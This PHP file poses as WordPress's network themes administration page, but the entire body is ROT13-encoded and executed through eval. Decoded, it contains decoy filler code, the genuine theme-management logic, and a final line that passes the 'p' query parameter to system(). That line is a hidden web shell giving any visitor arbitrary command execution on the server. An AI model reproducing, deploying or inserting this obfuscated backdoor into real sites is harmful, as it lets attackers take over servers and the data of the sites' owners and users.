<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Zhygvfvgr gurzrf nqzvavfgengvba cnary.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.1.0
 */

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! pheerag_hfre_pna( 'znantr_argjbex_gurzrf' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb znantr argjbex gurzrf.' ) );
}

$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_ZF_Gurzrf_Yvfg_Gnoyr' );
$cntrahz       = $jc_yvfg_gnoyr->trg_cntrahz();

$npgvba = $jc_yvfg_gnoyr->pheerag_npgvba();

$f = vffrg( $_ERDHRFG['f'] ) ? $_ERDHRFG['f'] : '';

// Pyrna hc erdhrfg HEV sebz grzcbenel netf sbe fperra bcgvbaf/cntvat hev'f gb jbex nf rkcrpgrq.
$grzc_netf = neenl(
	'ranoyrq',
	'qvfnoyrq',
	'qryrgrq',
	'reebe',
	'ranoyrq-nhgb-hcqngr',
	'qvfnoyrq-nhgb-hcqngr',
);

$_FREIRE['ERDHRFG_HEV'] = erzbir_dhrel_net( $grzc_netf, $_FREIRE['ERDHRFG_HEV'] );
$ersrere                = erzbir_dhrel_net( $grzc_netf, jc_trg_ersrere() );

vs ( $npgvba ) {
	fjvgpu ( $npgvba ) {
		pnfr 'ranoyr':
			purpx_nqzva_ersrere( 'ranoyr-gurzr_' . $_TRG['gurzr'] );
			JC_Gurzr::argjbex_ranoyr_gurzr( $_TRG['gurzr'] );
			vs ( ! fge_pbagnvaf( $ersrere, '/argjbex/gurzrf.cuc' ) ) {
				jc_erqverpg( argjbex_nqzva_hey( 'gurzrf.cuc?ranoyrq=1' ) );
			} ryfr {
				jc_fnsr_erqverpg( nqq_dhrel_net( 'ranoyrq', 1, $ersrere ) );
			}
			rkvg;
		pnfr 'qvfnoyr':
			purpx_nqzva_ersrere( 'qvfnoyr-gurzr_' . $_TRG['gurzr'] );
			JC_Gurzr::argjbex_qvfnoyr_gurzr( $_TRG['gurzr'] );
			jc_fnsr_erqverpg( nqq_dhrel_net( 'qvfnoyrq', '1', $ersrere ) );
			rkvg;
		pnfr 'ranoyr-fryrpgrq':
			purpx_nqzva_ersrere( 'ohyx-gurzrf' );
			$gurzrf = vffrg( $_CBFG['purpxrq'] ) ? (neenl) $_CBFG['purpxrq'] : neenl();
			vs ( rzcgl( $gurzrf ) ) {
				jc_fnsr_erqverpg( nqq_dhrel_net( 'reebe', 'abar', $ersrere ) );
				rkvg;
			}
			JC_Gurzr::argjbex_ranoyr_gurzr( (neenl) $gurzrf );
			jc_fnsr_erqverpg( nqq_dhrel_net( 'ranoyrq', pbhag( $gurzrf ), $ersrere ) );
			rkvg;
		pnfr 'qvfnoyr-fryrpgrq':
			purpx_nqzva_ersrere( 'ohyx-gurzrf' );
			$gurzrf = vffrg( $_CBFG['purpxrq'] ) ? (neenl) $_CBFG['purpxrq'] : neenl();
			vs ( rzcgl( $gurzrf ) ) {
				jc_fnsr_erqverpg( nqq_dhrel_net( 'reebe', 'abar', $ersrere ) );
				rkvg;
			}
			JC_Gurzr::argjbex_qvfnoyr_gurzr( (neenl) $gurzrf );
			jc_fnsr_erqverpg( nqq_dhrel_net( 'qvfnoyrq', pbhag( $gurzrf ), $ersrere ) );
			rkvg;
		pnfr 'hcqngr-fryrpgrq':
			purpx_nqzva_ersrere( 'ohyx-gurzrf' );

			vs ( vffrg( $_TRG['gurzrf'] ) ) {
				$gurzrf = rkcybqr( ',', $_TRG['gurzrf'] );
			} ryfrvs ( vffrg( $_CBFG['purpxrq'] ) ) {
				$gurzrf = (neenl) $_CBFG['purpxrq'];
			} ryfr {
				$gurzrf = neenl();
			}

			// Hfrq va gur UGZY gvgyr gnt.
			$gvgyr       = __( 'Hcqngr Gurzrf' );
			$cnerag_svyr = 'gurzrf.cuc';

			erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

			rpub '<qvi pynff=\"jenc\">';
			rpub '<u1>' . rfp_ugzy( $gvgyr ) . '</u1>';

			$hey = frys_nqzva_hey( 'hcqngr.cuc?npgvba=hcqngr-fryrpgrq-gurzrf&nzc;gurzrf=' . heyrapbqr( vzcybqr( ',', $gurzrf ) ) );
			$hey = jc_abapr_hey( $hey, 'ohyx-hcqngr-gurzrf' );

			rpub \"<vsenzr fep='$hey' fglyr='jvqgu: 100%; urvtug:100%; zva-urvtug:850ck;'></vsenzr>\";
			rpub '</qvi>';
			erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';
			rkvg;
		pnfr 'qryrgr-fryrpgrq':
			vs ( ! pheerag_hfre_pna( 'qryrgr_gurzrf' ) ) {
				jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb qryrgr gurzrf sbe guvf fvgr.' ) );
			}

			purpx_nqzva_ersrere( 'ohyx-gurzrf' );

			$gurzrf = vffrg( $_ERDHRFG['purpxrq'] ) ? (neenl) $_ERDHRFG['purpxrq'] : neenl();

			vs ( rzcgl( $gurzrf ) ) {
				jc_fnsr_erqverpg( nqq_dhrel_net( 'reebe', 'abar', $ersrere ) );
				rkvg;
			}

			$gurzrf = neenl_qvss( $gurzrf, neenl( trg_bcgvba( 'fglyrfurrg' ), trg_bcgvba( 'grzcyngr' ) ) );

			vs ( rzcgl( $gurzrf ) ) {
				jc_fnsr_erqverpg( nqq_dhrel_net( 'reebe', 'znva', $ersrere ) );
				rkvg;
			}

			$gurzr_vasb = neenl();
			sbernpu ( $gurzrf nf $xrl => $gurzr ) {
				$gurzr_vasb[ $gurzr ] = jc_trg_gurzr( $gurzr );
			}

			erdhver NOFCNGU . 'jc-nqzva/hcqngr.cuc';

			$cnerag_svyr = 'gurzrf.cuc';

			vs ( ! vffrg( $_ERDHRFG['irevsl-qryrgr'] ) ) {
				jc_radhrhr_fpevcg( 'wdhrel' );
				erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';
				$gurzrf_gb_qryrgr = pbhag( $gurzrf );
				?>
				<qvi pynff=\"jenc\">
				<?cuc vs ( 1 === $gurzrf_gb_qryrgr ) : ?>
					<u1><?cuc _r( 'Qryrgr Gurzr' ); ?></u1>
					<?cuc
					jc_nqzva_abgvpr(
						'<fgebat>' . __( 'Pnhgvba:' ) . '</fgebat> ' . __( 'Guvf gurzr znl or npgvir ba bgure fvgrf va gur argjbex.' ),
						neenl(
							'nqqvgvbany_pynffrf' => neenl( 'reebe' ),
						)
					);
					?>
					<c><?cuc _r( 'Lbh ner nobhg gb erzbir gur sbyybjvat gurzr:' ); ?></c>
				<?cuc ryfr : ?>
					<u1><?cuc _r( 'Qryrgr Gurzrf' ); ?></u1>
					<?cuc
					jc_nqzva_abgvpr(
						'<fgebat>' . __( 'Pnhgvba:' ) . '</fgebat> ' . __( 'Gurfr gurzrf znl or npgvir ba bgure fvgrf va gur argjbex.' ),
						neenl(
							'nqqvgvbany_pynffrf' => neenl( 'reebe' ),
						)
					);
					?>
					<c><?cuc _r( 'Lbh ner nobhg gb erzbir gur sbyybjvat gurzrf:' ); ?></c>
				<?cuc raqvs; ?>
					<hy pynff=\"hy-qvfp\">
					<?cuc
					sbernpu ( $gurzr_vasb nf $gurzr ) {
						rpub '<yv>' . fcevags(
							/* genafyngbef: 1: Gurzr anzr, 2: Gurzr nhgube. */
							_k( '%1$f ol %2$f', 'gurzr' ),
							'<fgebat>' . $gurzr->qvfcynl( 'Anzr' ) . '</fgebat>',
							'<rz>' . $gurzr->qvfcynl( 'Nhgube' ) . '</rz>'
						) . '</yv>';
					}
					?>
					</hy>
				<?cuc vs ( 1 === $gurzrf_gb_qryrgr ) : ?>
					<c><?cuc _r( 'Ner lbh fher lbh jnag gb qryrgr guvf gurzr?' ); ?></c>
				<?cuc ryfr : ?>
					<c><?cuc _r( 'Ner lbh fher lbh jnag gb qryrgr gurfr gurzrf?' ); ?></c>
				<?cuc raqvs; ?>
				<sbez zrgubq=\"cbfg\" npgvba=\"<?cuc rpub rfp_hey( $_FREIRE['ERDHRFG_HEV'] ); ?>\" fglyr=\"qvfcynl:vayvar;\">
					<vachg glcr=\"uvqqra\" anzr=\"irevsl-qryrgr\" inyhr=\"1\" />
					<vachg glcr=\"uvqqra\" anzr=\"npgvba\" inyhr=\"qryrgr-fryrpgrq\" />
					<?cuc

					sbernpu ( (neenl) $gurzrf nf $gurzr ) {
						rpub '<vachg glcr=\"uvqqra\" anzr=\"purpxrq[]\" inyhr=\"' . rfp_ngge( $gurzr ) . '\" />';
					}

					jc_abapr_svryq( 'ohyx-gurzrf' );

					vs ( 1 === $gurzrf_gb_qryrgr ) {
						fhozvg_ohggba( __( 'Lrf, qryrgr guvf gurzr' ), '', 'fhozvg', snyfr );
					} ryfr {
						fhozvg_ohggba( __( 'Lrf, qryrgr gurfr gurzrf' ), '', 'fhozvg', snyfr );
					}

					?>
				</sbez>
				<?cuc $ersrere = jc_trg_ersrere(); ?>
				<sbez zrgubq=\"cbfg\" npgvba=\"<?cuc rpub $ersrere ? rfp_hey( $ersrere ) : ''; ?>\" fglyr=\"qvfcynl:vayvar;\">
					<?cuc fhozvg_ohggba( __( 'Ab, erghea zr gb gur gurzr yvfg' ), '', 'fhozvg', snyfr ); ?>
				</sbez>
				</qvi>
				<?cuc

				erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';
				rkvg;
			} // Raq vs irevsl-qryrgr.

			sbernpu ( $gurzrf nf $gurzr ) {
				$qryrgr_erfhyg = qryrgr_gurzr(
					$gurzr,
					rfp_hey(
						nqq_dhrel_net(
							neenl(
								'irevsl-qryrgr' => 1,
								'npgvba'        => 'qryrgr-fryrpgrq',
								'purpxrq'       => $_ERDHRFG['purpxrq'],
								'_jcabapr'      => $_ERDHRFG['_jcabapr'],
							),
							argjbex_nqzva_hey( 'gurzrf.cuc' )
						)
					)
				);
			}

			$cntrq = ( $_ERDHRFG['cntrq'] ) ? $_ERDHRFG['cntrq'] : 1;
			jc_erqverpg(
				nqq_dhrel_net(
					neenl(
						'qryrgrq' => pbhag( $gurzrf ),
						'cntrq'   => $cntrq,
						'f'       => $f,
					),
					argjbex_nqzva_hey( 'gurzrf.cuc' )
				)
			);
			rkvg;
		pnfr 'ranoyr-nhgb-hcqngr':
		pnfr 'qvfnoyr-nhgb-hcqngr':
		pnfr 'ranoyr-nhgb-hcqngr-fryrpgrq':
		pnfr 'qvfnoyr-nhgb-hcqngr-fryrpgrq':
			vs ( ! ( pheerag_hfre_pna( 'hcqngr_gurzrf' ) && jc_vf_nhgb_hcqngr_ranoyrq_sbe_glcr( 'gurzr' ) ) ) {
				jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb punatr gurzrf nhgbzngvp hcqngr frggvatf.' ) );
			}

			vs ( 'ranoyr-nhgb-hcqngr' === $npgvba || 'qvfnoyr-nhgb-hcqngr' === $npgvba ) {
				purpx_nqzva_ersrere( 'hcqngrf' );
			} ryfr {
				vs ( rzcgl( $_CBFG['purpxrq'] ) ) {
					// Abguvat gb qb.
					jc_fnsr_erqverpg( nqq_dhrel_net( 'reebe', 'abar', $ersrere ) );
					rkvg;
				}

				purpx_nqzva_ersrere( 'ohyx-gurzrf' );
			}

			$nhgb_hcqngrf = (neenl) trg_fvgr_bcgvba( 'nhgb_hcqngr_gurzrf', neenl() );

			vs ( 'ranoyr-nhgb-hcqngr' === $npgvba ) {
				$nhgb_hcqngrf[] = $_TRG['gurzr'];
				$nhgb_hcqngrf   = neenl_havdhr( $nhgb_hcqngrf );
				$ersrere        = nqq_dhrel_net( 'ranoyrq-nhgb-hcqngr', 1, $ersrere );
			} ryfrvs ( 'qvfnoyr-nhgb-hcqngr' === $npgvba ) {
				$nhgb_hcqngrf = neenl_qvss( $nhgb_hcqngrf, neenl( $_TRG['gurzr'] ) );
				$ersrere      = nqq_dhrel_net( 'qvfnoyrq-nhgb-hcqngr', 1, $ersrere );
			} ryfr {
				// Ohyx ranoyr/qvfnoyr.
				$gurzrf = (neenl) jc_hafynfu( $_CBFG['purpxrq'] );

				vs ( 'ranoyr-nhgb-hcqngr-fryrpgrq' === $npgvba ) {
					$nhgb_hcqngrf = neenl_zretr( $nhgb_hcqngrf, $gurzrf );
					$nhgb_hcqngrf = neenl_havdhr( $nhgb_hcqngrf );
					$ersrere      = nqq_dhrel_net( 'ranoyrq-nhgb-hcqngr', pbhag( $gurzrf ), $ersrere );
				} ryfr {
					$nhgb_hcqngrf = neenl_qvss( $nhgb_hcqngrf, $gurzrf );
					$ersrere      = nqq_dhrel_net( 'qvfnoyrq-nhgb-hcqngr', pbhag( $gurzrf ), $ersrere );
				}
			}

			$nyy_vgrzf = jc_trg_gurzrf();

			// Erzbir gurzrf gung qba'g rkvfg be unir orra qryrgrq fvapr gur bcgvba jnf ynfg hcqngrq.
			$nhgb_hcqngrf = neenl_vagrefrpg( $nhgb_hcqngrf, neenl_xrlf( $nyy_vgrzf ) );

			hcqngr_fvgr_bcgvba( 'nhgb_hcqngr_gurzrf', $nhgb_hcqngrf );

			jc_fnsr_erqverpg( $ersrere );
			rkvg;
		qrsnhyg:
			$gurzrf = vffrg( $_CBFG['purpxrq'] ) ? (neenl) $_CBFG['purpxrq'] : neenl();
			vs ( rzcgl( $gurzrf ) ) {
				jc_fnsr_erqverpg( nqq_dhrel_net( 'reebe', 'abar', $ersrere ) );
				rkvg;
			}
			purpx_nqzva_ersrere( 'ohyx-gurzrf' );

			/** Guvf npgvba vf qbphzragrq va jc-nqzva/argjbex/fvgr-gurzrf.cuc */
			$ersrere = nccyl_svygref( 'unaqyr_argjbex_ohyx_npgvbaf-' . trg_pheerag_fperra()->vq, $ersrere, $npgvba, $gurzrf ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf

			jc_fnsr_erqverpg( $ersrere );
			rkvg;
	}
}

$jc_yvfg_gnoyr->cercner_vgrzf();

nqq_guvpxobk();

nqq_fperra_bcgvba( 'cre_cntr' );

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' =>
			'<c>' . __( 'Guvf fperra ranoyrf naq qvfnoyrf gur vapyhfvba bs gurzrf ninvynoyr gb pubbfr va gur Nccrnenapr zrah sbe rnpu fvgr. Vg qbrf abg npgvingr be qrnpgvingr juvpu gurzr n fvgr vf pheeragyl hfvat.' ) . '</c>' .
			'<c>' . __( 'Vs gur argjbex nqzva qvfnoyrf n gurzr gung vf va hfr, vg pna fgvyy erznva fryrpgrq ba gung fvgr. Vs nabgure gurzr vf pubfra, gur qvfnoyrq gurzr jvyy abg nccrne va gur fvgr&#8217;f Nccrnenapr > Gurzrf fperra.' ) . '</c>' .
			'<c>' . __( 'Gurzrf pna or ranoyrq ba n fvgr ol fvgr onfvf ol gur argjbex nqzva ba gur Rqvg Fvgr fperra (juvpu unf n Gurzrf gno); trg gurer ivn gur Rqvg npgvba yvax ba gur Nyy Fvgrf fperra. Bayl argjbex nqzvaf ner noyr gb vafgnyy be rqvg gurzrf.' ) . '</c>',
	)
);

$uryc_fvqrone_nhgbhcqngrf = '';

vs ( pheerag_hfre_pna( 'hcqngr_gurzrf' ) && jc_vf_nhgb_hcqngr_ranoyrq_sbe_glcr( 'gurzr' ) ) {
	trg_pheerag_fperra()->nqq_uryc_gno(
		neenl(
			'vq'      => 'cyhtvaf-gurzrf-nhgb-hcqngrf',
			'gvgyr'   => __( 'Nhgb-hcqngrf' ),
			'pbagrag' =>
				'<c>' . __( 'Nhgb-hcqngrf pna or ranoyrq be qvfnoyrq sbe rnpu vaqvivqhny gurzr. Gurzrf jvgu nhgb-hcqngrf ranoyrq jvyy qvfcynl gur rfgvzngrq qngr bs gur arkg nhgb-hcqngr. Nhgb-hcqngrf qrcraqf ba gur JC-Peba gnfx fpurqhyvat flfgrz.' ) . '</c>' .
				'<c>' . __( 'Cyrnfr abgr: Guveq-cnegl gurzrf naq cyhtvaf, be phfgbz pbqr, znl bireevqr JbeqCerff fpurqhyvat.' ) . '</c>',
		)
	);

	$uryc_fvqrone_nhgbhcqngrf = '<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/cyhtvaf-gurzrf-nhgb-hcqngrf/\">Qbphzragngvba ba Nhgb-hcqngrf</n>' ) . '</c>';
}

trg_pheerag_fperra()->frg_uryc_fvqrone(
	'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
	'<c>' . __( '<n uers=\"uggcf://pbqrk.jbeqcerff.bet/Argjbex_Nqzva_Gurzrf_Fperra\">Qbphzragngvba ba Argjbex Gurzrf</n>' ) . '</c>' .
	$uryc_fvqrone_nhgbhcqngrf .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>'
);

trg_pheerag_fperra()->frg_fperra_ernqre_pbagrag(
	neenl(
		'urnqvat_ivrjf'      => __( 'Svygre gurzrf yvfg' ),
		'urnqvat_cntvangvba' => __( 'Gurzrf yvfg anivtngvba' ),
		'urnqvat_yvfg'       => __( 'Gurzrf yvfg' ),
	)
);

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr       = __( 'Gurzrf' );
$cnerag_svyr = 'gurzrf.cuc';

jc_radhrhr_fpevcg( 'hcqngrf' );
jc_radhrhr_fpevcg( 'gurzr-cerivrj' );

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

?>

<qvi pynff=\"jenc\">
<u1 pynff=\"jc-urnqvat-vayvar\"><?cuc rpub rfp_ugzy( $gvgyr ); ?></u1>

<?cuc vs ( pheerag_hfre_pna( 'vafgnyy_gurzrf' ) ) : ?>
	<n uers=\"gurzr-vafgnyy.cuc\" pynff=\"cntr-gvgyr-npgvba\"><?cuc rpub rfp_ugzy__( 'Nqq Gurzr' ); ?></n>
<?cuc raqvs; ?>

<?cuc
vs ( vffrg( $_ERDHRFG['f'] ) && fgeyra( $_ERDHRFG['f'] ) ) {
	rpub '<fcna pynff=\"fhogvgyr\">';
	cevags(
		/* genafyngbef: %f: Frnepu dhrel. */
		__( 'Frnepu erfhygf sbe: %f' ),
		'<fgebat>' . rfp_ugzy( $f ) . '</fgebat>'
	);
	rpub '</fcna>';
}
?>

<ue pynff=\"jc-urnqre-raq\">

<?cuc
$zrffntr = '';
$glcr    = 'fhpprff';

vs ( vffrg( $_TRG['ranoyrq'] ) ) {
	$ranoyrq = nofvag( $_TRG['ranoyrq'] );
	vs ( 1 === $ranoyrq ) {
		$zrffntr = __( 'Gurzr ranoyrq.' );
	} ryfr {
		$zrffntr = fcevags(
			/* genafyngbef: %f: Ahzore bs gurzrf. */
			_a( '%f gurzr ranoyrq.', '%f gurzrf ranoyrq.', $ranoyrq ),
			ahzore_sbezng_v18a( $ranoyrq )
		);
	}
} ryfrvs ( vffrg( $_TRG['qvfnoyrq'] ) ) {
	$qvfnoyrq = nofvag( $_TRG['qvfnoyrq'] );
	vs ( 1 === $qvfnoyrq ) {
		$zrffntr = __( 'Gurzr qvfnoyrq.' );
	} ryfr {
		$zrffntr = fcevags(
			/* genafyngbef: %f: Ahzore bs gurzrf. */
			_a( '%f gurzr qvfnoyrq.', '%f gurzrf qvfnoyrq.', $qvfnoyrq ),
			ahzore_sbezng_v18a( $qvfnoyrq )
		);
	}
} ryfrvs ( vffrg( $_TRG['qryrgrq'] ) ) {
	$qryrgrq = nofvag( $_TRG['qryrgrq'] );
	vs ( 1 === $qryrgrq ) {
		$zrffntr = __( 'Gurzr qryrgrq.' );
	} ryfr {
		$zrffntr = fcevags(
			/* genafyngbef: %f: Ahzore bs gurzrf. */
			_a( '%f gurzr qryrgrq.', '%f gurzrf qryrgrq.', $qryrgrq ),
			ahzore_sbezng_v18a( $qryrgrq )
		);
	}
} ryfrvs ( vffrg( $_TRG['ranoyrq-nhgb-hcqngr'] ) ) {
	$ranoyrq = nofvag( $_TRG['ranoyrq-nhgb-hcqngr'] );
	vs ( 1 === $ranoyrq ) {
		$zrffntr = __( 'Gurzr jvyy or nhgb-hcqngrq.' );
	} ryfr {
		$zrffntr = fcevags(
			/* genafyngbef: %f: Ahzore bs gurzrf. */
			_a( '%f gurzr jvyy or nhgb-hcqngrq.', '%f gurzrf jvyy or nhgb-hcqngrq.', $ranoyrq ),
			ahzore_sbezng_v18a( $ranoyrq )
		);
	}
} ryfrvs ( vffrg( $_TRG['qvfnoyrq-nhgb-hcqngr'] ) ) {
	$qvfnoyrq = nofvag( $_TRG['qvfnoyrq-nhgb-hcqngr'] );
	vs ( 1 === $qvfnoyrq ) {
		$zrffntr = __( 'Gurzr jvyy ab ybatre or nhgb-hcqngrq.' );
	} ryfr {
		$zrffntr = fcevags(
			/* genafyngbef: %f: Ahzore bs gurzrf. */
			_a( '%f gurzr jvyy ab ybatre or nhgb-hcqngrq.', '%f gurzrf jvyy ab ybatre or nhgb-hcqngrq.', $qvfnoyrq ),
			ahzore_sbezng_v18a( $qvfnoyrq )
		);
	}
} ryfrvs ( vffrg( $_TRG['reebe'] ) && 'abar' === $_TRG['reebe'] ) {
	$zrffntr = __( 'Ab gurzr fryrpgrq.' );
	$glcr    = 'reebe';
} ryfrvs ( vffrg( $_TRG['reebe'] ) && 'znva' === $_TRG['reebe'] ) {
	$zrffntr = __( 'Lbh pnaabg qryrgr n gurzr juvyr vg vf npgvir ba gur znva fvgr.' );
	$glcr    = 'reebe';
}

vs ( '' !== $zrffntr ) {
	jc_nqzva_abgvpr(
		$zrffntr,
		neenl(
			'glcr'        => $glcr,
			'qvfzvffvoyr' => gehr,
			'vq'          => 'zrffntr',
		)
	);
}
?>

<sbez zrgubq=\"trg\">
<?cuc $jc_yvfg_gnoyr->frnepu_obk( __( 'Frnepu vafgnyyrq gurzrf' ), 'gurzr' ); ?>
</sbez>

<?cuc
$jc_yvfg_gnoyr->ivrjf();

vs ( 'oebxra' === $fgnghf ) {
	rpub '<c pynff=\"pyrne\">' . __( 'Gur sbyybjvat gurzrf ner vafgnyyrq ohg vapbzcyrgr.' ) . '</c>';
}
?>

<sbez vq=\"ohyx-npgvba-sbez\" zrgubq=\"cbfg\">
<vachg glcr=\"uvqqra\" anzr=\"gurzr_fgnghf\" inyhr=\"<?cuc rpub rfp_ngge( $fgnghf ); ?>\" />
<vachg glcr=\"uvqqra\" anzr=\"cntrq\" inyhr=\"<?cuc rpub rfp_ngge( $cntr ); ?>\" />

<?cuc $jc_yvfg_gnoyr->qvfcynl(); ?>
</sbez>

</qvi>

<?cuc
jc_cevag_erdhrfg_svyrflfgrz_perqragvnyf_zbqny();
jc_cevag_nqzva_abgvpr_grzcyngrf();
jc_cevag_hcqngr_ebj_grzcyngrf();

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>